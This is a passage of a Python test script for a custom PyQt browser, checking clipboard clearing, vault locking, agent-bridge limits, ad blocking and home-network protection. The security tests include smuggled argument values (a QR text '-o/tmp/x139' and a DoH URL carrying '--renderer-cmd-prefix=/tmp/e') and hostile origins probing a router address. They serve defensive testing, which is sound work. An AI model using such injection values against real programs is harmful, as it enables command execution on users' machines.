_gone135 = _QGA.clipboard().text()
check("each copied secret is cleared by its own timer, not the one before",
      _still135 == "secret-two-135" and _gone135 == "",
      str((_still135, _gone135)))
# E30 a mode brings the side panel back with its site
_modes_was135 = json.dumps(br.modes())
_mode_now135 = br.mode_now()
br.open_panel(srv.url("/twhome?panel135")); H.spin(400)
H.wait_for(lambda: "panel135" in br._panel_view.url().toString(), 6000)
br.save_mode("rv135")
br.toggle_panel(False); H.spin(200)
br.open_mode("rv135"); H.spin(400)
H.wait_for(lambda: "panel135" in br._panel_view.url().toString(), 6000)
_pon135 = bool(getattr(br, "_panel", None) is not None and br._panel.isVisible())
_purl135 = br._panel_view.url().toString() if _pon135 else ""
br.toggle_panel(False)
br.config["modes"] = json.loads(_modes_was135)
br.config["modeNow"] = _mode_now135
check("a mode saved with the side panel open opens it again, on its site",
      _pon135 and "panel135" in _purl135, str((_pon135, _purl135)))

# ===== tenth pass: a11y switches undo, a site's storage cleared ===========
# T18 bold starts switched off take the marks off the page
_bs_was136 = bool(br.a11y_config().get("boldStarts"))
_bv136 = br.new_tab(url=srv.url("/art96?bold136")); H.spin(300)
H.wait_for(lambda: jsq(_bv136, "document.readyState") == "complete", 6000)
br.set_a11y("boldStarts", True)
H.wait_for(lambda: (jsq(_bv136, "document.querySelectorAll('span.__a11yb')"
                               ".length") or 0) > 0, 6000)
_on136 = jsq(_bv136, "document.querySelectorAll('span.__a11yb').length")
br.set_a11y("boldStarts", False)
H.wait_for(lambda: jsq(_bv136, "document.querySelectorAll('span.__a11yb')"
                               ".length") == 0, 6000)
_off136 = jsq(_bv136, "document.querySelectorAll('span.__a11yb').length")
_text136 = jsq(_bv136, "document.querySelector('article p').textContent")
br.set_a11y("boldStarts", _bs_was136)
check("bold starts switched off give the page its own words back",
      (_on136 or 0) > 0 and _off136 == 0
      and str(_text136).startswith("Paragraph 0 of the article"),
      str((_on136, _off136, str(_text136)[:30])))
# T13 clearing a site takes its IndexedDB too, from every tab of it
H.js(_bv136, "localStorage.setItem('k136', '1');"
             "indexedDB.open('db136', 1).onsuccess = function (e) {"
             "  e.target.result.close(); window.__db136 = 1; }; 1")
H.wait_for(lambda: jsq(_bv136, "window.__db136 === 1"), 5000)
br.clear_site_data("127.0.0.1")
H.spin(1500)
H.wait_for(lambda: jsq(_bv136, "document.readyState") == "complete", 6000)
H.js(_bv136, "window.__dbs136 = null; indexedDB.databases().then("
             "function (d) { window.__dbs136 = d.map(function (x) {"
             " return x.name; }).join(','); }); 1")
H.wait_for(lambda: jsq(_bv136, "window.__dbs136 !== null"), 5000)
_dbs136 = jsq(_bv136, "window.__dbs136")
_ls136 = jsq(_bv136, "localStorage.getItem('k136')")
check("clearing a site's data takes its IndexedDB as well as its storage",
      "db136" not in str(_dbs136) and _ls136 is None,
      str((_dbs136, _ls136)))
try:
    if br.tabs.indexOf(_bv136) >= 0:
        br.close_tab(br.tabs.indexOf(_bv136), ask=False)
except RuntimeError:
    pass

# ===== notes page: the search box keeps a half-typed to-do ================
_np137 = br.new_tab(url=None); H.spin(200)
_np137.page().prime_trust(br.notes_url())
H.load(_np137, br.notes_url().toString())
H.wait_for(lambda: jsq(_np137, "!!document.getElementById('v_todo')"), 6000)
H.spin(800)
H.js(_np137, "document.getElementById('v_todo').click(); 1")
H.wait_for(lambda: jsq(_np137, "!!document.querySelector('#body input"
                               "[type=text]')"), 6000)
H.js(_np137, "var b = document.querySelector('#body input[type=text]');"
             "b.value = 'half typed 137';"
             "b.dispatchEvent(new Event('input', {bubbles: true}));"
             "var q = document.getElementById('q'); q.value = 'zz';"
             "q.dispatchEvent(new Event('input', {bubbles: true})); 1")
H.spin(1200)
H.wait_for(lambda: jsq(_np137, "!!document.querySelector('#body input"
                               "[type=text]')"), 4000)
_draft137 = jsq(_np137, "document.querySelector('#body input[type=text]')"
                        ".value")
H.js(_np137, "var q = document.getElementById('q'); q.value = '';"
             "q.dispatchEvent(new Event('input', {bubbles: true})); 1")
check("typing in the notes search box keeps a half-typed to-do",
      _draft137 == "half typed 137", str(_draft137))
try:
    if br.tabs.indexOf(_np137) >= 0:
        br.close_tab(br.tabs.indexOf(_np137), ask=False)
except RuntimeError:
    pass

# ===== eleventh pass: QR secrets, app windows, vault clock, timers ========
# V1 the QR text never goes on qrencode's command line
_qrsrc139 = __import__("inspect").getsource(B.Browser.qr_code)
_qr139 = []
_shown139 = None
if __import__("shutil").which("qrencode"):
    _real_show139 = br._show_qr
    br._show_qr = lambda image, text, then=None: _qr139.append(
        (image.isNull(), text)) or True
    try:
        _shown139 = br.qr_code("-o/tmp/x139 hello")
    finally:
        br._show_qr = _real_show139
check("a QR code's text goes to qrencode on its input, never its command line",
      '"--", text]' not in _qrsrc139 and "proc.write(" in _qrsrc139
      and (_shown139 is None or (_qr139 and _qr139[0] == (False,
                                                          "-o/tmp/x139 hello"))),
      str((_shown139, _qr139)))
# V2 a private tab opened as an app is a private window
_pv139 = br.new_tab(url=srv.url("/twhome?app139"), private=True,
                    switch=False); H.spin(300)
H.wait_for(lambda: "app139" in _pv139.url().toString(), 6000)
_aw139 = br.open_as_app(br._tab_url(_pv139), view=_pv139); H.spin(800)
_awp139 = bool(getattr(_aw139, "_all_private", False)) if _aw139 else None
check("a private tab opened as an app opens in a private window",
      _awp139 is True, str(_awp139))
# V3 an app window never writes its one site over the session
_st139 = json.dumps(br.config.get("sessionTabs"), sort_keys=True)
try:
    if _aw139 is not None:
        _aw139._save_groups(quiet=True)
except RuntimeError:
    pass
_st139b = json.dumps(br.config.get("sessionTabs"), sort_keys=True)
check("an app window does not save its site as his session",
      _st139 == _st139b)
try:
    if _aw139 is not None:
        _aw139._closing_anyway = True
        _aw139.close()
    if br.tabs.indexOf(_pv139) >= 0:
        br.close_tab(br.tabs.indexOf(_pv139), ask=False)
except RuntimeError:
    pass
H.spin(400)
# V9 the 2FA poll does not wind the auto-lock clock
_totp_src139 = __import__("inspect").getsource(B.Bridge.totpFor)
check("the once-a-second 2FA poll does not keep the vault from locking",
      "touch=False" in _totp_src139)
# V10 Ctrl+Shift+G copies as a secret, and clears it later
_gen139 = []
_real_cst139, _real_ccl139 = br._copy_secret_text, br.clear_clipboard_later
_real_vpo139 = br.vault_password_on
br._copy_secret_text = lambda text: _gen139.append("secret")
br.clear_clipboard_later = lambda *a, **k: _gen139.append("later") or True
br.vault_password_on = lambda: True
try:
    br.generate_to_clipboard()
finally:
    br._copy_secret_text, br.clear_clipboard_later = _real_cst139, _real_ccl139
    br.vault_password_on = _real_vpo139
    for _n139 in ("_copy_secret_text", "clear_clipboard_later",
                  "vault_password_on"):
        br.__dict__.pop(_n139, None)
check("Ctrl+Shift+G puts the password on the clipboard as a secret, cleared "
      "later", _gen139 == ["secret", "later"], str(_gen139))
# V18 a timer row with no sane time is dropped, and the desk tick runs
_tm_was139 = json.dumps(br.config.get("timers") or [])
br.config["timers"] = [{"name": "bad139", "at": "soon"},
                       {"name": "ok139", "at": _time.time() + 3600}]
_tick_err139 = None
try:
    br._desk_tick()
except Exception as _e139:
    _tick_err139 = repr(_e139)
_names139 = [r.get("name") for r in br.timers()]
br.config["timers"] = json.loads(_tm_was139)
check("a malformed timer row is dropped and the desk tick goes on",
      _tick_err139 is None and _names139 == ["ok139"],
      str((_tick_err139, _names139)))

# ===== eleventh pass: agent window, gestures, captions, subtitles =========
# V0 the agent bridge moves to a window that is open
import agent_bridge as _ab140
_aw140 = br.new_window(url=srv.url("/twhome?agent140")); H.spin(900)
_bridge140 = _ab140.AgentBridge(_aw140)
_aw140._closing_anyway = True
_aw140.close(); H.spin(500)
try:
    _now140 = _bridge140.win
except Exception as _e140:
    _now140 = repr(_e140)
check("the agent bridge works on an open window once its own is closed",
      _now140 is not _aw140 and _now140 in br.windows(), str(_now140))
try:
    _bridge140.server.close()
except (AttributeError, RuntimeError):
    pass
# V4 / V5 / V6 the gesture filter and the wheel step
_mw_src140 = __import__("inspect").getsource(B.MouseWatch) \
    if hasattr(B, "MouseWatch") else _Path(B.__file__).read_text()
check("right button + wheel skips hidden tabs, and a lost release does not "
      "leave a button held", "bar.isTabVisible(at)" in _mw_src140
      and "held = event.buttons()" in _mw_src140)
check("the custom wheel step leaves boxes that scroll themselves alone",
      "scrollsItself(e.target, \"y\")" in B.NAV_JS
      and "scrollsItself(e.target, \"x\")" in B.NAV_JS)
# V11 the palette's transcript menu opens once it is filled
_tv140 = br.new_tab(url=srv.url("/twhome?tr140")); H.spin(300)
H.wait_for(lambda: jsq(_tv140, "document.readyState") == "complete", 6000)
br.__dict__.pop("_media_menu_shown", None)
_tm140 = None
try:
    _tm140 = br.transcript_menu(view=_tv140, popup_at=B.QPoint(10, 10))
except TypeError as _e140:
    _tm140 = repr(_e140)
H.wait_for(lambda: getattr(br, "_media_menu_shown", None) is not None, 4000)
_shown140 = getattr(br, "_media_menu_shown", None)
_rows140 = len(_shown140.actions()) if _shown140 is not None else 0
check("the transcript menu from the palette shows up filled",
      _shown140 is not None and _rows140 >= 1, str((_tm140, _rows140)))
try:
    if _shown140 is not None:
        _shown140.close()
    if br.tabs.indexOf(_tv140) >= 0:
        br.close_tab(br.tabs.indexOf(_tv140), ask=False)
except RuntimeError:
    pass
# V12 a translated caption is taken off when its line ends
check("a translated page caption goes when the line ends",
      "clear=True" in __import__("inspect").getsource(
          B.Browser.translate_page_captions))
# V13 a German subtitle file saved on Windows keeps its umlauts
_sd140 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
(_sd140 / "film.srt").write_bytes(
    "1\r\n00:00:01,000 --> 00:00:02,000\r\nGrüße aus Köln\r\n".encode("cp1252"))
_url140, _p140 = br.subtitle_data_url(str(_sd140 / "film.srt"))
import base64 as _b64_140
_vtt140 = _b64_140.b64decode(_url140.split(",", 1)[1]).decode("utf-8") \
    if _url140 else ""
check("a subtitle file saved as Windows-1252 keeps its umlauts",
      "Grüße aus Köln" in _vtt140, _vtt140[-40:])

# ===== eleventh pass: agent sockets, bookmarks, open-with, history, tabs ==
check("a finished agent connection is deleted, and an endless line dropped",
      "conn.disconnected.connect(conn.deleteLater)"
      in (_Path(B.__file__).parent / "agent_bridge.py").read_text())
# V16 a rename refused by a lock tells the page
_bm_was141 = list(br.bookmarks)
br.bookmarks.append({"id": 141001, "type": "folder", "title": "lk141",
                     "locked": True})
br.bookmarks.append({"id": 141002, "type": "link", "title": "x141",
                     "url": "https://x141.example/", "parent": 141001})
_bmc141 = []
_bmcb141 = lambda *a: _bmc141.append(1)
br.bridge.bookmarksChanged.connect(_bmcb141)
br.update_bookmark(141002, "renamed141", "https://x141.example/")
H.spin(100)
try:
    br.bridge.bookmarksChanged.disconnect(_bmcb141)
except TypeError:
    pass
_title141 = next((e["title"] for e in br.bookmarks if e.get("id") == 141002),
                 None)
br.bookmarks[:] = _bm_was141
check("a rename a lock refuses leaves the title and tells the page to redraw",
      _title141 == "x141" and len(_bmc141) >= 1, str((_title141, _bmc141)))
# V19 an open-with rule's flags reach the program
_ow_was141 = br.config.get("openWith", "__absent__")
_real_owr141 = br.open_with_rules
br.open_with_rules = lambda: {"pdf": "zathura --fork --mode 'a b'"}
try:
    _args141 = br.open_with_args("doc.pdf")
except AttributeError:
    _args141 = None
br.__dict__.pop("open_with_rules", None)
check("an open-with rule's arguments are passed to the program",
      _args141 == ["--fork", "--mode", "a b"], str(_args141))
# V22 statistics leave out the hops the list leaves out
_hist_was141 = list(br.history)
_now141 = _time.time()
br.history.append({"url": "https://real141.example/page", "t": _now141,
                   "title": "r"})
_noise141 = next((h for h in getattr(B, "NOISE_HOSTS", ()) if "." in h),
                 None)
if _noise141:
    br.history.append({"url": "https://%s/redirect?x=1" % _noise141,
                       "t": _now141, "title": "n"})
_stats141 = br.browsing_stats(days=1)
br.history[:] = _hist_was141
_hosts141 = [r["host"] for r in _stats141["sites"]]
check("browsing statistics leave out sign-in bounces and link wrappers",
      "real141.example" in _hosts141
      and (not _noise141 or not any(_noise141.endswith(h) or h.endswith(
          _noise141) for h in _hosts141)), str((_noise141, _hosts141[:5])))
# V25 a tab closed to the left is not "the tab before"
_ta141 = br.new_tab(url=srv.url("/twhome?a141")); H.spin(200)
_tb141 = br.new_tab(url=srv.url("/twhome?b141")); H.spin(200)
_tc141 = br.new_tab(url=srv.url("/twhome?c141"), switch=False); H.spin(200)
br.tabs.setCurrentWidget(_ta141); H.spin(150)
br.tabs.setCurrentWidget(_tb141); H.spin(150)
_mid141 = br.new_tab(url=srv.url("/twhome?m141"), switch=False)
br.tabs.tabBar().moveTab(br.tabs.indexOf(_mid141), br.tabs.indexOf(_tb141))
H.spin(150)
br.tabs.setCurrentWidget(_tb141); H.spin(150)
_before0_141 = getattr(br, "_tab_before", None)
br.close_tab(br.tabs.indexOf(_mid141), ask=False); H.spin(300)
check("closing a tab to the left of the one in front leaves 'the tab before'",
      br.current() is _tb141 and getattr(br, "_tab_before", None)
      is _before0_141, str((br.current() is _tb141,
                            getattr(br, "_tab_before", None) is _ta141)))
for _w141 in (_ta141, _tb141, _tc141):
    try:
        if br.tabs.indexOf(_w141) >= 0:
            br.close_tab(br.tabs.indexOf(_w141), ask=False)
    except RuntimeError:
        pass
# V29 a saved transcript keeps its milliseconds, and no cue is zero long
_sd141 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
_srt141 = br.save_subtitles([{"t": 1.25, "e": 1.25, "text": "a"},
                             {"t": 3.5, "e": 4.75, "text": "b"}],
                            path=str(_sd141 / "t.srt"))
_txt141 = (_sd141 / "t.srt").read_text() if _srt141 else ""
check("a saved transcript keeps its timing and has no zero-length cue",
      "00:00:01,250 --> 00:00:03,250" in _txt141
      and "00:00:03,500 --> 00:00:04,750" in _txt141, _txt141[:120])
# V28 / V23 the passwords page and the history page
_pwh141 = (_Path(B.__file__).parent / "passwords.html").read_text()
_hh141 = (_Path(B.__file__).parent / "history.html").read_text()
check("a vault lock forgets the Esc draft, and 'yesterday' is a calendar day",
      _pwh141.count("escDraft = null") >= 4
      and "midnight - 86400" not in _hh141)

# ===== eleventh pass: agent client, wheel volume, generator, pages =======
import importlib as _il142
_agent142 = _il142.import_module("agent")
_wf142 = getattr(_agent142, "_wait_for", None)
check("the agent client waits as long as the op it asked for",
      _wf142 is not None and _wf142({"timeout": 700000}) == 730.0
      and _wf142({"op": "tabs"}) == 60.0 and _wf142({}, 5) == 5.0)
# V20 switching wheel-over-video off reaches the open pages
_wv_was142 = br.config.get("wheelVolume", False)
_wv142 = br.new_tab(url=srv.url("/twhome?wv142")); H.spin(300)
H.wait_for(lambda: jsq(_wv142, "document.readyState") == "complete", 6000)
br.media_tool("wheelvolume", view=_wv142)
H.wait_for(lambda: jsq(_wv142, "window.__wheelVol === true",
                       B.APP_WORLD_ID), 4000)
br.bridge.setSetting("wheelVolume", "false")
H.wait_for(lambda: jsq(_wv142, "window.__wheelVolOn === false",
                       B.APP_WORLD_ID), 4000)
_off142 = jsq(_wv142, "window.__wheelVolOn", B.APP_WORLD_ID)
br.config["wheelVolume"] = _wv_was142
check("switching wheel-over-video off stops it on pages already open",
      _off142 is False, str(_off142))
try:
    if br.tabs.indexOf(_wv142) >= 0:
        br.close_tab(br.tabs.indexOf(_wv142), ask=False)
except RuntimeError:
    pass
# V27 the generator opens on his saved settings
_pg_was142 = br.config.get("pwGen", "__absent__")
br.config["pwGen"] = {"length": 40, "symbols": False, "digits": True,
                      "upper": True, "ambiguous": False}
try:
    _gc142 = json.loads(br.bridge.generatorChoice(br.bridge_key()
                                                  if hasattr(br, "bridge_key")
                                                  else "") or "{}")
except (AttributeError, TypeError):
    _gc142 = None
if _pg_was142 == "__absent__":
    br.config.pop("pwGen", None)
else:
    br.config["pwGen"] = _pg_was142
_pwh142 = (_Path(B.__file__).parent / "passwords.html").read_text()
check("the password generator opens on the settings he left it at",
      hasattr(br.bridge, "generatorChoice")
      and "bridge.generatorChoice(KEY" in _pwh142, str(_gc142))
# V24 / V17 picks and a rename in progress
_hh142 = (_Path(B.__file__).parent / "history.html").read_text()
_bh142 = (_Path(B.__file__).parent / "bookmarks.html").read_text()
check("deleted history rows drop their picks, and a redraw keeps a rename",
      "if (key === lastFilter)" in _hh142 and "editDraft" in _bh142)

# ===== twelfth pass: ad block per site, guard lists, clips, proxy names ===
# W0 blocking switched back on for a subdomain of a site that is let off
_abo_was143 = json.dumps(br.config.get("adBlockOff") or {})
_ab_was143 = br.config.get("adBlock", False)
br.config["adBlock"] = True
br.config["adBlockOff"] = {"rv143.example": True}
_before143 = br.ad_block_on("m.rv143.example")
br.ad_block_on("m.rv143.example", True)
_after143 = br.ad_block_on("m.rv143.example")
_parent143 = br.ad_block_on("rv143.example")
br.config["adBlockOff"] = json.loads(_abo_was143)
br.config["adBlock"] = _ab_was143
check("ad blocking switched on again for a subdomain of a site let off holds",
      _before143 is False and _after143 is True and _parent143 is False,
      str((_before143, _after143, _parent143)))
# W3 a protocol-relative frame from another site is dropped
_pgsrc143 = (_Path(B.__file__).parent / "page_guard.py").read_text()
check("the frame guard resolves //host frames, and watches src changes",
      "new URL(src, location.href)" in _pgsrc143
      and 'attributeFilter: ["src"]' in _pgsrc143)
# W4 letting a site open windows renews the guard script
_rg143 = []
_real_rg143 = br.refresh_guard_scripts
br.refresh_guard_scripts = lambda *a, **k: _rg143.append(1)
_pop_was143 = list(br.site_rules("popupSites"))
try:
    br.toggle_site_rule("popupSites", "pop143.example")
finally:
    br.refresh_guard_scripts = _real_rg143
    br.__dict__.pop("refresh_guard_scripts", None)
br.config["popupSites"] = _pop_was143
check("letting a site open windows renews the guard's script",
      len(_rg143) >= 1, str(_rg143))
# W5 / W6 a copy in a private window is not recorded; off clears the list
_ch_was143 = br.config.get("clipHistory", False)
br.config["clipHistory"] = True
_dk143 = br.desk()
_pw143 = br.new_private_window(); H.spin(800)
_real_aw143 = B.QApplication.activeWindow
try:
    B.QApplication.activeWindow = staticmethod(lambda: _pw143)
    _patched143 = True
except (TypeError, AttributeError):
    _patched143 = False
    _pw143.activateWindow(); H.spin(300)
_QGA.clipboard().setText("private-secret-143")
try:
    br._clipboard_changed()
finally:
    if _patched143:
        B.QApplication.activeWindow = _real_aw143
_clips143 = [c.get("text") for c in (_dk143.clips() if _dk143 else [])]
if _dk143 is not None:
    _dk143.add_clip("kept-143", "text") if hasattr(_dk143, "add_clip") else None
br.watch_clipboard(False)
_left143 = len(_dk143.clips()) if _dk143 is not None else 0
br.config["clipHistory"] = _ch_was143
try:
    _pw143._closing_anyway = True
    _pw143.close()
except RuntimeError:
    pass
H.spin(300)
check("a copy made in a private window stays out of the clip history, and "
      "switching it off empties the list",
      "private-secret-143" not in _clips143 and _left143 == 0,
      str((_clips143[:3], _left143)))
# W8 a proxy profile named "auto" is refused
_pp_was143 = json.dumps(br.config.get("proxyProfiles") or [])
br.bridge.saveProxyProfile(json.dumps({"name": "auto", "type": "http",
                                       "host": "192.0.2.10", "port": 8080}))
_names143 = [p.get("name") for p in (br.config.get("proxyProfiles") or [])
             if isinstance(p, dict)]
br.config["proxyProfiles"] = json.loads(_pp_was143)
check("a proxy profile called 'auto' is refused, like system and direct",
      "auto" not in _names143, str(_names143))

# ===== twelfth pass: LAN from blob pages, history traps, notes, pages =====
import privacy as _pv144
_blob144 = _pv144.check_request({"blockLocal": True},
                                B.QUrl("http://192.168.1.1/"),
                                B.QUrl("blob:https://evil144.example/uuid"))
_data144 = _pv144.check_request({"blockLocal": True},
                                B.QUrl("http://192.168.1.1/"),
                                B.QUrl("data:text/html,hi"))
_mine144 = _pv144.check_request({"blockLocal": True},
                                B.QUrl("http://192.168.1.1/"), None)
check("a public site's blob: or data: page cannot reach the home network; "
      "his own navigation can", _blob144[0] is False and _data144[0] is False
      and _mine144[0] is True, str((_blob144[0], _data144[0], _mine144[0])))
_nav_src144 = __import__("inspect").getsource(B.WebPage.acceptNavigationRequest) \
    if hasattr(B, "WebPage") else ""
check("cleaning tracking never re-issues Back, Forward or Reload",
      "NT.NavigationTypeReload)):" in _nav_src144)
# W17 another notes folder reloads the snippet expander
_nf_was144 = br.config.get("notesFolder", "")
_rs144 = []
_real_rs144 = br.refresh_snippet_script
br.refresh_snippet_script = lambda *a, **k: _rs144.append(1)
try:
    br.set_notes_folder(str(_Path(_tempfile.mkdtemp(
        dir=str(B.CONFIG_FILE.parent)))))
finally:
    br.refresh_snippet_script = _real_rs144
    br.__dict__.pop("refresh_snippet_script", None)
br.set_notes_folder(_nf_was144)
check("pointing the notes at another folder reloads the snippets",
      len(_rs144) >= 1, str(_rs144))
# W24 / W9 / W7 / W25 / W10
_ss_src144 = __import__("inspect").getsource(B.Bridge.setSetting)
_set144 = (_Path(B.__file__).parent / "settings.html").read_text()
_mic144 = (_Path(B.__file__).parent / "mictest.html").read_text()
_start144 = (_Path(B.__file__).parent / "start.html").read_text()
_tw144 = (_Path(B.__file__).parent / "theme_web.py").read_text()
check("the start page follows its rows' settings; the history switch, the "
      "device lists, the setup wizard and re-theming are fixed",
      '"countdowns", "agendaFile", "startRecent"' in _ss_src144
      and 'document.getElementById("histenc").onchange' in _set144
      and "const was = select.value;" in _mic144
      and "if (!bridge) maybeStartSetup();" in _start144
      and "orig.delete(all[i]);" in _tw144)

# ===== review of the whole 2ab diff, part 2 ===============================
# X9 the side buttons' off switch holds with gestures off, press and release
from PyQt6.QtGui import QMouseEvent as _QME145
from PyQt6.QtCore import QPointF as _QPF145, QObject as _QO145
_mg_was145 = br.config.get("mouseGestures", False)
_mb_was145 = br.config.get("mouseButtons", True)
br.config["mouseGestures"] = False
br.config["mouseButtons"] = False
_mw145 = B.MouseWatch(br)
_mv145 = br.new_tab(url=srv.url("/twhome?mb145"), switch=False); H.spin(200)
_obj145 = _QO145()
_mw145.views[_obj145] = _mv145
_held145 = []
for _kind145 in (B.QEvent.Type.MouseButtonPress,
                 B.QEvent.Type.MouseButtonRelease):
    _ev145 = _QME145(_kind145, _QPF145(5, 5), _QPF145(5, 5),
                     B.Qt.MouseButton.XButton1, B.Qt.MouseButton.NoButton,
                     B.Qt.KeyboardModifier.NoModifier)
    _held145.append(bool(_mw145._watch(_obj145, _ev145)))
br.config["mouseGestures"] = _mg_was145
br.config["mouseButtons"] = _mb_was145
_close_if_open(_mv145)
check("side buttons switched off are held back with gestures off, press "
      "and release", _held145 == [True, True], str(_held145))
# X7 the Settings engine text follows a dropped engine
_et_was145 = br.config.get("enginesText", "__absent__")
_oe_was145 = json.dumps(br.config.get("ownEngines") or [])
br.add_engine("Drop145", "https://drop145.example/?q=%s", "", engine_id="d145")
br.drop_engine("d145")
_text145 = str(br.config.get("enginesText") or "")
if _et_was145 == "__absent__":
    br.config.pop("enginesText", None)
else:
    br.config["enginesText"] = _et_was145
br.config["ownEngines"] = json.loads(_oe_was145)
check("a dropped engine leaves the Settings engine text too",
      "drop145" not in _text145, _text145[-120:])
# X6 terminals that wait
check("only terminals that wait for the editor are used",
      not any(n == "x-terminal-emulator" for n, _a in B.Browser.TERMINALS)
      and dict(B.Browser.TERMINALS).get("konsole", [""])[0] == "--nofork")
# X1 an update the store refused is undone
class _Refuse145:
    eager = False

    def put(self, item):
        return None

    def delete(self, item_id):
        return True


_v145 = B.PasswordVault(_Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent))))
_v145.add_item({"type": "login", "host": "imp145.example", "username": "u",
                "password": "old145", "title": "t"})
_v145.provider = _Refuse145()
try:
    _v145.import_rows("url,username,password\n"
                      "https://imp145.example/,u,new145\n")
except (TypeError, KeyError, AttributeError):
    pass
_pw145 = [i.get("password") for i in _v145.items()
          if i.get("host") == "imp145.example"]
check("an import's update the store refused leaves the login as it was",
      _pw145 == ["old145"], str(_pw145))

# ===== review of the 2ac diff: agent wait, zone labels, desk, cookies =====
_ab146 = (_Path(B.__file__).parent / "agent_bridge.py").read_text()
check("an agent wait whose client hung up stops without an exception",
      "gave_up = True" in _ab146)
_za146 = B._zone_answer("stream at 8 PM EST")
_ta146 = B._time_answer("time in est")
check("a zone typed as EST is shown as EST (UTC-5), not an inverted Etc name",
      _za146 is not None and "(UTC-5)" in _za146[0]
      and "Etc/" not in _za146[0] and _ta146 is not None
      and "EST (UTC-5)" in _ta146[0], str((_za146, _ta146)))
_src146 = _Path(B.__file__).read_text()
check("the window that takes over the session restores it first, and a "
      "parent's block leaves a subdomain he allowed",
      "_restore_as_writer = True" in _src146
      and 'self.cookie_rules().get(here) == "allow"' in _src146)
if br.desk() is not None:
    _dw146 = br.new_window(); H.spin(700)
    _same146 = _dw146.desk() is br.desk()
    try:
        _dw146._closing_anyway = True
        _dw146.close()
    except RuntimeError:
        pass
    H.spin(300)
    check("every window shares one notes drawer and clip history",
          _same146 is True, str(_same146))

# ===== thirteenth pass (security): agent pages, launch config, DoH, forget =
# Z0 the agent cannot drive the browser's own pages or local files
import agent_bridge as _ab149
_br149 = _ab149.AgentBridge(br)
_lv_was149 = br.config.get("bridgeLevel", "__absent__")
br.config["bridgeLevel"] = "full"
try:
    _own149 = _br149.allowed("open", B.QUrl.fromLocalFile(
        str(_Path(B.__file__).parent / "settings.html")).toString())
    _tabown149 = _br149.allowed("js", "", B.QUrl(B.START_PAGE).toString())
    _web149 = _br149.allowed("open", "https://ok149.example/")
    _blank149 = _br149.allowed("text", "", "about:blank")
finally:
    if _lv_was149 == "__absent__":
        br.config.pop("bridgeLevel", None)
    else:
        br.config["bridgeLevel"] = _lv_was149
    try:
        _br149.server.close()
    except (AttributeError, RuntimeError):
        pass
check("an agent can open web pages but not the browser's own pages or files",
      _own149[0] is False and _tabown149[0] is False and _web149[0] is True
      and _blank149[0] is True, str((_own149, _tabown149, _web149, _blank149)))
# Z1 a config file of the wrong shape cannot stop the start
_cf_text149 = B.CONFIG_FILE.read_text() if B.CONFIG_FILE.exists() else None
_launch149 = None
try:
    B.CONFIG_FILE.write_text("[]")
    _launch149 = B._launch_config()
finally:
    if _cf_text149 is None:
        B.CONFIG_FILE.unlink()
    else:
        B.CONFIG_FILE.write_text(_cf_text149)
_bad149 = {"proxy": "direct", "proxyProfiles": ["a", {"name": "p149",
           "type": "http", "host": "192.0.2.10", "port": 8080}],
           "proxyAuto": [], "activeProxy": ["x"]}
_err149 = None
try:
    B._migrate_proxy_config(_bad149)
    B._proxy_launch_flags(_bad149)
except Exception as _e149:
    _err149 = repr(_e149)
check("a config of the wrong shape (or wrong-typed proxy keys) does not stop "
      "the start", _launch149 == {} and _err149 is None,
      str((_launch149, _err149)))
# Z2 a DoH address with a space in it is not a second engine switch
_evil149 = B._privacy_flags({"doh": True, "dohUrl":
                             "https://x149/dns --renderer-cmd-prefix=/tmp/e"})
_good149 = B._privacy_flags({"doh": True, "dohUrl": "https://dns149.example/q"})
check("a DoH address that would smuggle a switch is refused",
      not any("renderer-cmd-prefix" in f for f in _evil149)
      and not any("dns-over-https" in f for f in _evil149)
      and any("dns149.example" in f for f in _good149),
      str((_evil149, _good149)))
# Z3 forgetting a site forgets this run's grants for it
_key149 = "https://meet149.example|use the microphone"
_sp149 = getattr(br, "_session_perms", None)
if isinstance(_sp149, dict):
    _sp149[_key149] = True
_perms_was149 = json.dumps(br.config.get("permissions") or {})
br.config.setdefault("permissions", {})[_key149] = True
br.forget_site("meet149.example")
_left149 = isinstance(_sp149, dict) and _key149 in _sp149
br.config["permissions"] = json.loads(_perms_was149)
if isinstance(_sp149, dict):
    _sp149.pop(_key149, None)
check("forgetting a site takes back this run's answers for it too",
      _sp149 is not None and not _left149, str((_sp149 is not None, _left149)))
# ===== thirteenth pass (security), part 2 ================================
import privacy as _pv150


class _Pg150:
    def __init__(self, own, opener=None):
        self._own = B.QUrl(own)
        if opener is not None:
            self._opener_url = B.QUrl(opener)

    def url(self):
        return self._own


_lan150 = B.QUrl("http://192.168.1.1/")
_r1 = _pv150.check_request({"blockLocal": True}, _lan150,
                           B._page_for_check(_Pg150("", "https://evil150.example/")))
_r2 = _pv150.check_request({"blockLocal": True}, _lan150,
                           B._page_for_check(_Pg150("about:blank",
                                                    "http://192.168.1.5/")))
_r3 = _pv150.check_request({"blockLocal": True}, _lan150,
                           B._page_for_check(_Pg150("about:blank")))
check("a tab a public page opened cannot reach the home network; one the "
      "router's own page opened can; a blank page nobody is known to have "
      "opened counts as made by a page", _r1[0] is False and _r2[0] is True
      and _r3[0] is False, str((_r1[0], _r2[0], _r3[0])))
_tab150 = br.new_tab(); H.spin(500)
# a web page first: from the start page a web address is bounced to the
# other web channel before anything else is asked
H.load(_tab150, srv.url("/urltext"))
H.wait_for(lambda: "urltext" in _tab150.url().toString(), 8000)
_pg150 = _tab150.page()
_NT150 = B.QWebEnginePage.NavigationType
_pg150._nav_hop = B.QUrl("https://public150.example/")
_bad150 = _pg150.acceptNavigationRequest(
    B.QUrl("http://192.168.1.1/login"), _NT150.NavigationTypeRedirect, True)
_pg150._nav_hop = B.QUrl("http://192.168.1.1/")
_ok150 = _pg150.acceptNavigationRequest(
    B.QUrl("http://192.168.1.1/login"), _NT150.NavigationTypeRedirect, True)
_close_if_open(_tab150)
check("a redirect is checked against the address it comes from: a public "
      "site cannot bounce the tab to the router, the router can send it to "
      "its own login", _bad150 is False and _ok150 is True,
      str((_bad150, _ok150)))
check("a look-alike behind www. or login. is flagged, the real site's own "
      "subdomains are not", B.lookalike_warning("www.paypa1.com")
      == "looks:paypal.com" and B.lookalike_warning("login.arnazon.com")
      == "looks:amazon.com" and B.lookalike_warning("learn.microsoft.com")
      == "" and B.lookalike_warning("mail.google.com") == "")
import agent_bridge as _ab150
check("the agent's cookie host must be a bare host name",
      _ab150.AgentBridge._clean_host("allowed.com/.com") is None
      and _ab150.AgentBridge._clean_host("www.Example.com") == "example.com"
